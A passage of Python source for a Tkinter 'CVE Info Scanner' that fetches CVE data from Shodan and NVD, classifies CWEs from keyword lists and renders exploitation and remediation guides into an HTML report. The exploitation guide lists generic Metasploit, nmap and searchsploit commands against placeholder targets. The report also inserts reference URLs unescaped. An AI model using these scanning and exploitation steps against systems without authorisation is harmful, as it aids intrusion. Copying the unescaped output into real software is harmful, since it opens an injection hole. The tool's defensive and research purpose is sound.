                    res_m = requests.get(url_m, params=params_m, timeout=5)
                    if res_m.status_code == 200:
                        dados_m = res_m.json()
                        if dados_m.get("responseStatus") == 200:
                            traduzido = dados_m.get("responseData", {}).get("translatedText")
                            if traduzido:
                                traduzido = html.unescape(traduzido)
                except Exception:
                    pass

            # 3ª: Lingva
            if not traduzido:
                try:
                    url_l = f"https://lingva.ml/api/v1/en/pt/{requests.utils.quote(bloco)}"
                    res_l = requests.get(url_l, timeout=5)
                    if res_l.status_code == 200:
                        traduzido = res_l.json().get("translation")
                except Exception:
                    pass

            traducao_final.append(traduzido if traduzido else bloco)

        return " ".join(traducao_final)

    # ── Análise de CWE ──

    def identificar_cwe_da_descricao(self, descricao):
        """Identifica o CWE analisando palavras-chave na descrição (fallback)"""
        descricao_lower = descricao.lower()
        keyword_map = {
            "CWE-89": ["sql injection", "sql inject", "sqli", "sql command",
                       "sql query", "database injection", "blind sql"],
            "CWE-79": ["cross-site scripting", "cross site scripting", "xss",
                       "script injection", "reflected xss", "stored xss",
                       "dom-based xss", "html injection"],
            "CWE-78": ["command injection", "os command", "shell command",
                       "command exec", "remote command", "arbitrary command",
                       "code execution via command"],
            "CWE-22": ["path traversal", "directory traversal", "dot dot",
                       "../", "..\\", "file inclusion", "local file", "lfi", "rfi"],
            "CWE-119": ["buffer overflow", "buffer over-read", "stack overflow",
                        "heap overflow", "memory corruption", "out-of-bounds",
                        "stack-based buffer", "heap-based buffer", "integer overflow"],
            "CWE-287": ["authentication bypass", "improper authentication",
                        "broken authentication", "auth bypass", "credential",
                        "brute force", "weak password", "default password"],
            "CWE-200": ["information disclosure", "information exposure",
                        "sensitive data", "data leak", "information leak",
                        "expose sensitive", "directory listing", "error message"],
            "CWE-352": ["cross-site request forgery", "csrf", "xsrf",
                        "request forgery", "forged request"],
            "CWE-434": ["file upload", "unrestricted upload", "arbitrary file upload",
                        "malicious file", "upload vulnerability", "webshell upload"],
            "CWE-306": ["missing authentication", "no authentication",
                        "unauthenticated access", "without authentication",
                        "access control", "unauthorized access", "privilege escalation"],
            "CWE-502": ["deserialization", "deserialize", "insecure deserialization",
                        "object injection", "pickle", "unserialize",
                        "yaml.load", "java serialization"],
        }
        scores = {}
        for cwe, keywords in keyword_map.items():
            score = sum(len(kw) for kw in keywords if kw in descricao_lower)
            if score > 0:
                scores[cwe] = score
        if scores:
            return max(scores, key=scores.get)
        return None

    def buscar_cwe_nvd(self, cve_id):
        """★ NOVO: Busca o CWE oficial direto na API do NVD (NIST)"""
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-{cve_id}"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            res = requests.get(url, headers=headers, timeout=15)
            if res.status_code != 200:
                return None, None
            data = res.json()
            vulns = data.get("vulnerabilities", [])
            if not vulns:
                return None, None
            cve_item = vulns[0]["cve"]

            # Extrair CWE(s) do campo weaknesses
            cwes = []
            try:
                for desc in cve_item.get("weaknesses", []):
                    for d in desc.get("description", []):
                        val = d.get("value", "")
                        if val.startswith("CWE-"):
                            cwes.append(val)
            except Exception:
                pass
            cwe_id = cwes[0] if cwes else None

            cwe_nome = ""
            if cwe_id and cwe_id in self.cwe_database:
                cwe_nome = self.cwe_database[cwe_id]["nome"]

            return cwe_id, cwe_nome
        except Exception:
            return None, None

    def obter_cwe_para_relatorio(self):
        """★ NOVO: Garante que sempre temos o CWE para o HTML"""
        cwe_id = self.dados_atuais.get("cwe_id", "")
        cwe_nome = self.dados_atuais.get("cwe_nome", "")

        if not cwe_id or cwe_id == "N/A":
            # Tenta buscar o CWE oficial na NVD antes de desistir
            cve = self.dados_atuais.get("cve_id", "")
            if cve:
                cwe_id, cwe_nome = self.buscar_cwe_nvd(cve)
                if cwe_id:
                    self.dados_atuais["cwe_id"] = cwe_id
                    self.dados_atuais["cwe_nome"] = cwe_nome or ""
        elif cwe_id in self.cwe_database and not cwe_nome:
            cwe_nome = self.cwe_database[cwe_id]["nome"]
            self.dados_atuais["cwe_nome"] = cwe_nome

        if cwe_id and cwe_id != "N/A":
            return f"{cwe_id} - {cwe_nome}" if cwe_nome else cwe_id
        return "N/A"

    # ── Geração de guias ──

    def gerar_guia_exploracao(self, cwe_id, cve_id, descricao):
        """Gera guia detalhado de como explorar a vulnerabilidade"""
        self.limpar_widget(self.text_exploit)

        self.inserir_texto(f"{'═' * 60}\n", "separador", self.text_exploit)
        self.inserir_texto(f"  💀 GUIA DE EXPLORAÇÃO - CVE-{cve_id}\n", "titulo", self.text_exploit)
        self.inserir_texto(f"{'═' * 60}\n\n", "separador", self.text_exploit)

        self.inserir_texto("⚠️  AVISO LEGAL - USO ÉTICO APENAS!\n", "erro", self.text_exploit)
        self.inserir_texto("─" * 50 + "\n", "separador", self.text_exploit)
        self.inserir_texto("Este guia é para fins educacionais, testes de\n", "aviso", self.text_exploit)
        self.inserir_texto("penetração autorizados e pesquisa de segurança.\n", "aviso", self.text_exploit)
        self.inserir_texto("Explorar sistemas sem autorização é CRIME!\n", "erro", self.text_exploit)
        self.inserir_texto("Art. 154-A do Código Penal Brasileiro\n\n", "aviso", self.text_exploit)

        if cwe_id and cwe_id in self.cwe_database:
            cwe_info = self.cwe_database[cwe_id]
            self.inserir_texto(f"📋 Tipo: {cwe_id} - {cwe_info['nome']}\n\n", "destaque", self.text_exploit)
            self.inserir_texto("🎯 MÉTODOS DE EXPLORAÇÃO:\n", "subtitulo", self.text_exploit)
            self.inserir_texto("─" * 50 + "\n", "separador", self.text_exploit)

            for linha in cwe_info["explorar"]:
                if linha == "":
                    self.inserir_texto("\n", "valor", self.text_exploit)
                elif linha.startswith(("1.", "2.", "3.", "4.", "5.")):
                    self.inserir_texto(f"\n{linha}\n", "passo", self.text_exploit)
                elif linha.strip().startswith("•"):
                    self.inserir_texto(f"  {linha}\n", "ferramenta", self.text_exploit)
                elif linha.strip().startswith(("Payload:", "URL:", "Campo")):
                    self.inserir_texto(f"  {linha}\n", "codigo", self.text_exploit)
                else:
                    self.inserir_texto(f"  {linha}\n", "valor", self.text_exploit)

            self.inserir_texto(f"\n{'─' * 50}\n", "separador", self.text_exploit)
            self.inserir_texto(f"\n🔬 ANÁLISE ESPECÍFICA DO CVE-{cve_id}:\n", "subtitulo", self.text_exploit)
            self.gerar_analise_especifica_exploit(descricao, cwe_id)
        else:
            self.gerar_guia_generico_exploit(descricao, cve_id)

        self.inserir_texto(f"\n{'─' * 50}\n", "separador", self.text_exploit)
        self.inserir_texto("\n🧰 FERRAMENTAS GERAIS RECOMENDADAS:\n", "subtitulo", self.text_exploit)
        ferramentas = [
            "• Metasploit Framework: msfconsole",
            f"  search CVE-{cve_id}",
            "  use exploit/...",
            "  set RHOSTS target_ip",
            "  exploit",
            "",
            "• Nmap (scan de vulnerabilidades):",
            "  nmap --script vulners,vulscan --script-args vulscandb=cve.csv -sV TARGET",
            "  nmap --script vuln TARGET",
            "",
            "• Searchsploit (Exploit-DB local):",
            f"  searchsploit CVE-{cve_id}",
            "  searchsploit -m EXPLOIT_ID",
            "",
            "• Nuclei (scanner de templates):",
            f"  nuclei -u TARGET -t cves/CVE-{cve_id}.yaml",
            "",
            "• Burp Suite Professional:",
            "  Scanner automático + Repeater manual",
        ]
        for f in ferramentas:
            if f == "":
                self.inserir_texto("\n", "valor", self.text_exploit)
            elif f.startswith("•"):
                self.inserir_texto(f"  {f}\n", "ferramenta", self.text_exploit)
            else:
                self.inserir_texto(f"    {f}\n", "codigo", self.text_exploit)

        # ★ Salvar conteúdo COMPLETO da aba para o relatório HTML
        self.dados_atuais["como_explorar"] = self.obter_texto_completo(self.text_exploit)

    def gerar_analise_especifica_exploit(self, descricao, cwe_id):
        """Analisa a descrição para dar dicas específicas"""
        desc_lower = descricao.lower()
        dicas = []

        if "remote" in desc_lower or "remotely" in desc_lower:
            dicas.append("🌐 ATAQUE REMOTO possível - não requer acesso local")
        if "unauthenticated" in desc_lower or "without auth" in desc_lower:
            dicas.append("🔓 NÃO requer autenticação - ataque sem credenciais")
        if "arbitrary code" in desc_lower or "code execution" in desc_lower:
            dicas.append("💣 EXECUÇÃO DE CÓDIGO ARBITRÁRIO - severidade máxima")
        if "denial of service" in desc_lower or "dos" in desc_lower:
            dicas.append("⛔ NEGAÇÃO DE SERVIÇO (DoS) - pode derrubar o sistema")
        if "privilege" in desc_lower and "escalat" in desc_lower:
            dicas.append("⬆ ESCALAÇÃO DE PRIVILÉGIOS - de user para admin/root")
        if "apache" in desc_lower:
            dicas.append("🌐 Alvo: Apache HTTP Server")
        if "nginx" in desc_lower:
            dicas.append("🌐 Alvo: Nginx Web Server")
        if "wordpress" in desc_lower:
            dicas.append("📝 Alvo: WordPress CMS")
        if "linux" in desc_lower or "kernel" in desc_lower:
            dicas.append("🐧 Alvo: Linux Kernel")
        if "windows" in desc_lower:
            dicas.append("🪟 Alvo: Microsoft Windows")
        if "allows" in desc_lower and "via" in desc_lower:
            try:
                idx = desc_lower.index("via")
                vetor = descricao[idx: idx + 80].strip()
                dicas.append(f"🎯 Vetor: {vetor}")
            except (ValueError, IndexError):
                pass

        if dicas:
            for dica in dicas:
                self.inserir_texto(f"  {dica}\n", "destaque", self.text_exploit)
        else:
            self.inserir_texto("  Análise automática limitada.\n  Consulte as referências para detalhes.\n",
                               "aviso", self.text_exploit)

    def gerar_guia_generico_exploit(self, descricao, cve_id):
        """Guia genérico quando o CWE não é identificado"""
        self.inserir_texto("⚠ CWE específico não identificado automaticamente.\n\n", "aviso", self.text_exploit)
        self.inserir_texto("🔍 PASSOS GERAIS DE TESTE:\n", "subtitulo", self.text_exploit)
        passos = [
            "1. RECONHECIMENTO:",
            "   • Identificar versão exata do software afetado",
            "   • Verificar se seu alvo usa a versão vulnerável",
            "   • nmap -sV TARGET (identificar serviços)",
            "",
            "2. BUSCAR EXPLOITS EXISTENTES:",
            f"   • searchsploit CVE-{cve_id}",
            f"   • Google: 'CVE-{cve_id} exploit poc github'",
            f"   • Exploit-DB: exploit-db.com/search?cve={cve_id}",
            "",
            "3. TESTAR EM AMBIENTE CONTROLADO:",
            "   • Montar lab com versão vulnerável",
            "   • Docker/VM com o software afetado",
            "   • Aplicar exploit e documentar",
            "",
            "4. VALIDAR IMPACTO:",
            "   • Confirmar se o exploit funciona",
            "   • Documentar evidências",
            "   • Reportar de forma responsável",
        ]
        for p in passos:
            if p == "":
                self.inserir_texto("\n", "valor", self.text_exploit)
            elif p[0].isdigit():
                self.inserir_texto(f"\n{p}\n", "passo", self.text_exploit)
            else:
                self.inserir_texto(f"  {p}\n", "codigo", self.text_exploit)

    def gerar_guia_correcao(self, cwe_id, cve_id, descricao, produtos):
        """Gera guia detalhado de como corrigir a vulnerabilidade"""
        self.limpar_widget(self.text_fix)

        self.inserir_texto(f"{'═' * 60}\n", "separador", self.text_fix)
        self.inserir_texto(f"  🛡 GUIA DE CORREÇÃO - CVE-{cve_id}\n", "titulo", self.text_fix)
        self.inserir_texto(f"{'═' * 60}\n\n", "separador", self.text_fix)

        self.inserir_texto("🚨 AÇÕES IMEDIATAS (Primeiras 24h):\n", "erro", self.text_fix)
        self.inserir_texto("─" * 50 + "\n", "separador", self.text_fix)
        acoes_imediatas = [
            "1. Verificar se seus sistemas são afetados",
            "2. Aplicar patches/atualizações disponíveis",
            "3. Implementar mitigações temporárias se não há patch",
            "4. Monitorar logs para sinais de exploração",
            "5. Notificar equipe de segurança e stakeholders",
        ]
        for acao in acoes_imediatas:
            self.inserir_texto(f"  {acao}\n", "passo", self.text_fix)
        self.inserir_texto("\n", "valor", self.text_fix)

        if cwe_id and cwe_id in self.cwe_database:
            cwe_info = self.cwe_database[cwe_id]
            self.inserir_texto(f"📋 Correção para: {cwe_id} - {cwe_info['nome']}\n\n", "destaque", self.text_fix)
            self.inserir_texto("🔧 CORREÇÕES ESPECÍFICAS:\n", "subtitulo", self.text_fix)
            self.inserir_texto("─" * 50 + "\n", "separador", self.text_fix)

            for linha in cwe_info["corrigir"]:
                if linha == "":
                    self.inserir_texto("\n", "valor", self.text_fix)
                elif linha.startswith(("1.", "2.", "3.", "4.", "5.")):
                    self.inserir_texto(f"\n{linha}\n", "passo", self.text_fix)
                elif linha.strip().startswith("•"):
                    self.inserir_texto(f"  {linha}\n", "ferramenta", self.text_fix)
                elif linha.strip().startswith(("EVITAR", "Usar:", "Em vez")):
                    self.inserir_texto(f"  {linha}\n", "erro", self.text_fix)
                else:
                    self.inserir_texto(f"  {linha}\n", "codigo", self.text_fix)
        else:
            self.gerar_correcao_generica(descricao)

        if produtos:
            self.inserir_texto(f"\n{'─' * 50}\n", "separador", self.text_fix)
            self.inserir_texto("\n📦 PRODUTOS AFETADOS - Ações por produto:\n", "subtitulo", self.text_fix)
            for cpe in produtos:
                partes = cpe.split(":")
                vendor = partes[3] if len(partes) > 3 else "?"
                product = partes[4] if len(partes) > 4 else "?"
                version = partes[5] if len(partes) > 5 else "?"
                self.inserir_texto(f"\n  📌 {vendor} / {product}\n", "destaque", self.text_fix)
                self.inserir_texto(f"     Versão vulnerável: {version}\n", "erro", self.text_fix)
                self.inserir_texto(f"     → Atualizar para versão mais recente\n", "valor", self.text_fix)
                self.inserir_texto(f"     → Verificar: https://nvd.nist.gov/vuln/detail/CVE-{cve_id}\n",
                                   "codigo", self.text_fix)

        self.inserir_texto(f"\n{'─' * 50}\n", "separador", self.text_fix)
        self.inserir_texto("\n📚 BOAS PRÁTICAS GERAIS DE SEGURANÇA:\n", "subtitulo", self.text_fix)
        praticas = [
            "• Manter todos os softwares atualizados",
            "• Implementar defesa em profundidade (múltiplas camadas)",
            "• Usar WAF (Web Application Firewall)",
            "• Realizar testes de penetração regulares",
            "• Monitorar CVEs relevantes para seu stack",
            "• Implementar logging e alertas de segurança",
            "• Seguir o princípio do menor privilégio",
            "• Fazer backup regular e testar restauração",
            "• Treinar desenvolvedores em secure coding",
            "• Usar ferramentas SAST/DAST no CI/CD",
        ]
        for p in praticas:
            self.inserir_texto(f"  {p}\n", "ferramenta", self.text_fix)

        self.inserir_texto(f"\n{'─' * 50}\n", "separador", self.text_fix)
        self.inserir_texto("\n🔗 RECURSOS PARA CORREÇÃO:\n", "subtitulo", self.text_fix)
        recursos = [
            f"  • NVD: https://nvd.nist.gov/vuln/detail/CVE-{cve_id}",
            f"  • MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-{cve_id}",
            "  • OWASP: https://owasp.org/www-project-top-ten/",
            "  • CWE: https://cwe.mitre.org/",
        ]
        for r in recursos:
            self.inserir_texto(f"{r}\n", "codigo", self.text_fix)

        # ★ Salvar conteúdo COMPLETO da aba para o relatório HTML
        self.dados_atuais["como_corrigir"] = self.obter_texto_completo(self.text_fix)

    def gerar_correcao_generica(self, descricao):
        """Correção genérica quando CWE não é identificado"""
        self.inserir_texto("⚠ CWE específico não identificado.\n", "aviso", self.text_fix)
        self.inserir_texto("Aplicando recomendações genéricas:\n\n", "aviso", self.text_fix)
        correcoes = [
            "1. ATUALIZAÇÃO IMEDIATA:",
            "   • Verificar se há patch do fabricante",
            "   • Aplicar atualização de segurança",
            "   • Reiniciar serviços se necessário",
            "",
            "2. MITIGAÇÃO TEMPORÁRIA:",
            "   • Bloquear acesso ao componente vulnerável",
            "   • Adicionar regras no firewall/WAF",
            "   • Desabilitar funcionalidade afetada",
            "",
            "3. MONITORAMENTO:",
            "   • Ativar logging detalhado",
            "   • Configurar alertas para atividade suspeita",
            "   • Revisar logs em busca de exploração",
            "",
            "4. VALIDAÇÃO:",
            "   • Rodar scan de vulnerabilidade após patch",
            "   • Testar se a correção foi efetiva",
            "   • Documentar ações tomadas",
        ]
        for c in correcoes:
            if c == "":
                self.inserir_texto("\n", "valor", self.text_fix)
            elif c[0].isdigit():
                self.inserir_texto(f"\n{c}\n", "passo", self.text_fix)
            else:
                self.inserir_texto(f"  {c}\n", "codigo", self.text_fix)

    # ── Busca principal ──

    def iniciar_busca(self):
        cve_id = self.entry_cve.get().strip().upper()
        if cve_id.startswith("CVE-"):
            cve_id = cve_id[4:]
        if not cve_id:
            messagebox.showwarning("Atenção", "Por favor, digite um número CVE!")
            return
        self.status_var.set(f"🔄 Buscando CVE-{cve_id}...")
        self.root.update()
        threading.Thread(target=self.buscar_cve_info, args=(cve_id,), daemon=True).start()

    def buscar_cve_info(self, cve_id):
        # ★ FIX: toda atualização de UI roda na main thread via root.after
        def ui(func, *args):
            self.root.after(0, func, *args)

        ui(self.limpar_resultados)
        ui(self.limpar_referencias)

        url = f"https://cvedb.shodan.io/cve/CVE-{cve_id}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                   "Accept": "application/json"}

        try:
            response = requests.get(url, headers=headers, timeout=15)
        except requests.exceptions.Timeout:
            ui(self.inserir_texto, "\n❌ Tempo limite excedido.\n", "erro")
            ui(self.status_var.set, "Erro: Timeout")
            return
        except requests.exceptions.ConnectionError:
            ui(self.inserir_texto, "\n❌ Erro de conexão.\n", "erro")
            ui(self.status_var.set, "Erro: Sem conexão")
            return
        except Exception as e:
            ui(self.inserir_texto, f"\n❌ Erro: {e}\n", "erro")
            ui(self.status_var.set, "Erro na requisição")
            return

        if response.status_code != 200:
            ui(self.inserir_texto, f"\n❌ Erro: Status {response.status_code}\n", "erro")
            if response.status_code == 404:
                ui(self.inserir_texto, "   ⚠ CVE não encontrada.\n", "erro")
            ui(self.status_var.set, f"Erro: {response.status_code}")
            return

        try:
            data = response.json()
        except ValueError:
            ui(self.inserir_texto, "\n❌ Erro ao interpretar JSON.\n", "erro")
            ui(self.status_var.set, "Erro: JSON inválido")
            return

        descricao = data.get("summary", "Descrição não disponível.")
        cvss_score = data.get("cvss", "N/A")
        cpes = data.get("cpes", [])
        referencias = sorted(set(data.get("references", [])))

        ui(self.status_var.set, "🔄 Traduzindo descrição...")
        descricao_pt = self.traduzir_texto_nativo(descricao)

        nivel, cor_html, tag_nivel = "Indefinido", "#ffffff", "nenhum"
        try:
            score = float(cvss_score)
            if score == 0.0:
                nivel, cor_html, tag_nivel = "🟢 Sem impacto", "#00ff88", "nenhum"
            elif score <= 3.9:
                nivel, cor_html, tag_nivel = "🔵 Baixo", "#00d4ff", "baixo"
            elif score <= 6.9:
                nivel, cor_html, tag_nivel = "🟡 Médio", "#ffcc00", "medio"
            elif score <= 8.9:
                nivel, cor_html, tag_nivel = "🔴 Alto", "#ff4444", "alto"
            else:
                nivel, cor_html, tag_nivel = "💀 CRÍTICO", "#ff00ff", "critico"
        except (ValueError, TypeError):
            pass

        # ★ FIX: CWE oficial vem da NVD; descrição é apenas fallback
        ui(self.status_var.set, "🔄 Buscando CWE oficial na NVD...")
        cwe_id, cwe_nome = self.buscar_cwe_nvd(cve_id)

        if not cwe_id:
            ui(self.status_var.set, "🔄 Analisando tipo de vulnerabilidade...")
            cwe_id = self.identificar_cwe_da_descricao(descricao)
        if cwe_id and cwe_id in self.cwe_database:
            cwe_nome = self.cwe_database[cwe_id]["nome"]

        self.dados_atuais.update({
            "cve_id": cve_id,
            "descricao_orig": descricao,
            "descricao_pt": descricao_pt,
            "cvss": str(cvss_score),
            "nivel": nivel,
            "cor_html": cor_html,
            "produtos_afetados": cpes,
            "cwe_id": cwe_id or "N/A",
            "cwe_nome": cwe_nome,
            "como_explorar": "",
            "como_corrigir": "",
            "resultado_completo": "",
        })

        # ── Aba Resultado ──
        ui(self.inserir_texto, f"{'═' * 60}\n", "separador")
        ui(self.inserir_texto, f"  📋 CVE-{cve_id}\n", "titulo")
        ui(self.inserir_texto, f"{'═' * 60}\n\n", "separador")
        if cwe_id:
            ui(self.inserir_texto, f"🔎 Tipo: {cwe_id} - {cwe_nome}\n\n", "destaque")
        ui(self.inserir_texto, "📝 Descrição Original (EN)\n", "subtitulo")
        ui(self.inserir_texto, "─" * 50 + "\n", "separador")
        ui(self.inserir_texto, f"{descricao}\n\n", "descricao")
        ui(self.inserir_texto, "🌐 Descrição Traduzida (PT-BR)\n", "subtitulo")
        ui(self.inserir_texto, "─" * 50 + "\n", "separador")
        ui(self.inserir_texto, f"{descricao_pt}\n\n", "traducao")
        ui(self.inserir_texto, "─" * 50 + "\n", "separador")
        ui(self.inserir_texto, "⚡ CVSS: ", "subtitulo")
        ui(self.inserir_texto, f"{cvss_score}\n", "valor")
        ui(self.inserir_texto, "🛡 Severidade: ", "subtitulo")
        ui(self.inserir_texto, f"{nivel}\n", tag_nivel)

        pub_date = data.get("published_time", None)
        if pub_date:
            ui(self.inserir_texto, "📅 Publicação: ", "subtitulo")
            ui(self.inserir_texto, f"{pub_date}\n", "valor")

        if cpes:
            ui(self.inserir_texto, f"\n📦 Produtos Afetados: {len(cpes)}\n", "subtitulo")
            for cpe in cpes:
                ui(self.inserir_texto, f"   • {cpe}\n", "valor")

        ui(self.inserir_texto, f"\n{'═' * 60}\n", "separador")

        ui(self.status_var.set, "🔄 Gerando guias de exploração e correção...")
        ui(self.gerar_guia_exploracao, cwe_id, cve_id, descricao)
        ui(self.gerar_guia_correcao, cwe_id, cve_id, descricao, cpes)

        # ★ Salvar o conteúdo completo da aba Resultado
        def salvar_resultado_completo():
            self.dados_atuais["resultado_completo"] = self.obter_texto_completo(self.text_resultado)
        ui(salvar_resultado_completo)

        if referencias:
            ui(self.criar_botoes_referencias, referencias)
            ui(self.inserir_texto, f"\n✅ {len(referencias)} referências encontradas\n", "valor")
        else:
            ui(self.inserir_texto, "\n❌ Nenhuma referência encontrada.\n", "erro")

        ui(self.status_var.set,
           f"✅ Análise completa para CVE-{cve_id} | CWE: {cwe_id or 'N/A'}")

    def criar_botoes_referencias(self, referencias):
        self.limpar_referencias()

        for i, ref in enumerate(referencias, start=1):
            row_frame = tk.Frame(self.refs_container, bg="#0a0a1a")
            row_frame.pack(fill="x", padx=5, pady=2)

            tk.Label(row_frame, text=f"[{i:02d}]", font=("Consolas", 9, "bold"),
                     fg="#ff6600", bg="#0a0a1a", width=5).pack(side="left", padx=(5, 2))

            tk.Button(row_frame, text="🌐 Abrir", font=("Consolas", 8, "bold"),
                      bg="#ff6600", fg="#000000", activebackground="#ff9944",
                      relief="raised", bd=2, cursor="hand2",
                      command=lambda u=ref: self.abrir_url(u)).pack(side="left", padx=5)

            url_label = tk.Label(row_frame, text=ref, font=("Consolas", 9),
                                 fg="#00d4ff", bg="#0a0a1a", anchor="w", cursor="hand2")
            url_label.pack(side="left", fill="x", expand=True, padx=5)
            url_label.bind("<Button-1>", lambda e, u=ref: self.abrir_url(u))
            url_label.bind("<Enter>", lambda e, lbl=url_label: lbl.config(fg="#00ff88"))
            url_label.bind("<Leave>", lambda e, lbl=url_label: lbl.config(fg="#00d4ff"))

            tk.Frame(self.refs_container, bg="#333366", height=1).pack(fill="x", padx=10, pady=1)
            self.referencias_links.append(ref)

        if len(referencias) > 1:
            tk.Frame(self.refs_container, bg="#0a0a1a", height=10).pack()
            tk.Button(self.refs_container,
                      text=f"🚀 ABRIR TODAS AS {len(referencias)} REFERÊNCIAS NO NAVEGADOR",
                      font=("Consolas", 10, "bold"), bg="#00ff88", fg="#000000",
                      activebackground="#00cc66", relief="raised", bd=3,
                      cursor="hand2", pady=8,
                      command=self.abrir_todas_referencias).pack(fill="x", padx=20, pady=10)

    def abrir_todas_referencias(self):
        if not self.referencias_links:
            return
        if messagebox.askyesno("Confirmar", f"Abrir {len(self.referencias_links)} links?"):
            for link in self.referencias_links:
                webbrowser.open(link)
            self.status_var.set(f"🌐 {len(self.referencias_links)} links abertos")

    def gerar_html(self):
        """Exporta relatório HTML completo — CWE, exploit, fix, referências
        e os demais resultados (análise completa + produtos) abaixo deles"""
        if not self.dados_atuais["cve_id"]:
            messagebox.showwarning("Atenção", "Faça uma busca antes de gerar o relatório.")
            return

        arquivo = filedialog.asksaveasfilename(
            defaultextension=".html",
            initialfile=f"Relatorio_CVE-{self.dados_atuais['cve_id']}.html",
            title="Salvar Relatório HTML",
            filetypes=[("Arquivos HTML", "*.html")],
        )
        if not arquivo:
            return

        data_hora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")

        links_html = "".join(
            [f"<li><a href='{link}' target='_blank'>{link}</a></li>" for link in self.referencias_links]
        ) if self.referencias_links else "<li>Nenhuma referência disponível.</li>"

        desc_orig = html.escape(self.dados_atuais["descricao_orig"])
        desc_pt = html.escape(self.dados_atuais["descricao_pt"])

        # CWE garantido — busca na NVD se estiver N/A
        cwe_info_text = self.obter_cwe_para_relatorio()

        # Conteúdo COMPLETO das abas
        como_explorar = html.escape(
            self.dados_atuais.get("como_explorar") or
            self.obter_texto_completo(self.text_exploit) or
            "Informação não disponível para este tipo de CVE."
        )
        como_corrigir = html.escape(
            self.dados_atuais.get("como_corrigir") or
            self.obter_texto_completo(self.text_fix) or
            "Consulte as referências para instruções do fabricante."
        )

        resultado_completo = html.escape(
            self.dados_atuais.get("resultado_completo") or
            self.obter_texto_completo(self.text_resultado) or
            ""
        )

        # Todos os produtos afetados (sem corte)
        produtos_html = "".join(
            f"<li><code>{html.escape(cpe)}</code></li>"
            for cpe in self.dados_atuais.get("produtos_afetados", [])
        )

        html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Relatório CVE-{self.dados_atuais['cve_id']}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, sans-serif; background: #1a1a2e;
                color: #e0e0e0; padding: 20px; line-height: 1.6; }}
        .container {{ max-width: 1000px; margin: auto; background: #16213e; padding: 30px;
                      border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
                      border-top: 5px solid #00d4ff; }}
        h1 {{ color: #00d4ff; text-align: center; border-bottom: 2px solid #0f3460;
              padding-bottom: 15px; margin-bottom: 20px; }}
        h2 {{ color: #ffcc00; margin-top: 30px; margin-bottom: 10px;
              border-bottom: 1px solid #333; padding-bottom: 5px; }}
        .info-grid {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; }}
        .info-card {{ background: #0a0a1a; padding: 15px; border-radius: 6px;
                      text-align: center; border: 1px solid #333366; }}
        .info-card .label {{ color: #ffcc00; font-size: 0.9em; margin-bottom: 5px; }}
        .info-card .value {{ font-size: 1.3em; font-weight: bold; }}
        .desc-box {{ font-size: 15px; background: #0a0a1a; padding: 18px;
                     border-radius: 6px; margin-top: 8px; }}
        .desc-pt {{ border-left: 4px solid #00ff88; color: #fff; }}
        .desc-orig {{ border-left: 4px solid #00d4ff; color: #bbddff; }}
        .code-box {{ background: #0a0a1a; padding: 20px; border-radius: 6px; margin-top: 8px;
                     border-left: 4px solid #ff6600; font-family: 'Consolas', monospace;
                     font-size: 13px; white-space: pre-wrap; overflow-x: auto; }}
        .fix-box {{ background: #0a0a1a; padding: 20px; border-radius: 6px; margin-top: 8px;
                    border-left: 4px solid #00ff88; font-family: 'Consolas', monospace;
                    font-size: 13px; white-space: pre-wrap; }}
        .full-box {{ background: #0a0a1a; padding: 20px; border-radius: 6px; margin-top: 8px;
                     border-left: 4px solid #00d4ff; font-family: 'Consolas', monospace;
                     font-size: 13px; white-space: pre-wrap; }}
        .warning {{ background: #3a1a1a; border: 2px solid #ff4444; border-radius: 6px;
                    padding: 15px; margin: 15px 0; color: #ff6666; text-align: center;
                    font-weight: bold; }}
        .ref-list {{ background: #0a0a1a; padding: 20px 20px 20px 40px;
                     border-radius: 6px; margin-top: 8px; }}
        .ref-list li {{ margin-bottom: 8px; }}
        a {{ color: #ff6600; text-decoration: none; word-break: break-all; }}
        a:hover {{ text-decoration: underline; color: #ff9944; }}
        .footer {{ text-align: center; margin-top: 35px; padding-top: 15px;
                   border-top: 1px solid #333; font-size: 0.85em; color: #777; }}
        .footer span {{ color: #00d4ff; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>📋 Relatório Completo de Vulnerabilidade<br>CVE-{self.dados_atuais['cve_id']}</h1>

        <div class="info-grid">
            <div class="info-card">
                <div class="label">⚡ CVSS</div>
                <div class="value" style="color: {self.dados_atuais['cor_html']}">{self.dados_atuais['cvss']}</div>
            </div>
            <div class="info-card">
                <div class="label">🛡 Severidade</div>
                <div class="value" style="color: {self.dados_atuais['cor_html']}">{self.dados_atuais['nivel']}</div>
            </div>
            <div class="info-card">
                <div class="label">🔎 Tipo (CWE)</div>
                <div class="value" style="color: #ff6600; font-size: 0.9em;">{cwe_info_text}</div>
            </div>
        </div>

        <h2>🌐 Descrição (Português-BR)</h2>
        <div class="desc-box desc-pt">{desc_pt}</div>

        <h2>📝 Descrição Original (Inglês)</h2>
        <div class="desc-box desc-orig">{desc_orig}</div>

        <h2>💀 Como Explorar esta Vulnerabilidade (Guia Completo)</h2>
        <div class="warning">⚠️ AVISO: Uso apenas para testes autorizados e pesquisa.
            Acesso não autorizado é crime!</div>
        <div class="code-box">{como_explorar}</div>

        <h2>🔗 Referências ({len(self.referencias_links)})</h2>
        <ul class="ref-list">{links_html}</ul>

        <h2>🛡 Como Corrigir / Mitigar (Guia Completo)</h2>
        <div class="fix-box">{como_corrigir}</div>

        <h2>📊 Resultado Completo da Análise</h2>
        <div class="full-box">{resultado_completo if resultado_completo else 'Execute uma busca para gerar o resultado completo.'}</div>

        {"<h2>📦 Produtos Afetados</h2><ul class='ref-list'>" + produtos_html + "</ul>" if produtos_html else ""}

        <div class="footer">
            Relatório gerado em <span>{data_hora}</span>
            por <span>CVE Info Scanner v2.5</span> 🔍
        </div>
    </div>
</body>
</html>"""

        try:
            with open(arquivo, "w", encoding="utf-8") as file:
                file.write(html_content)
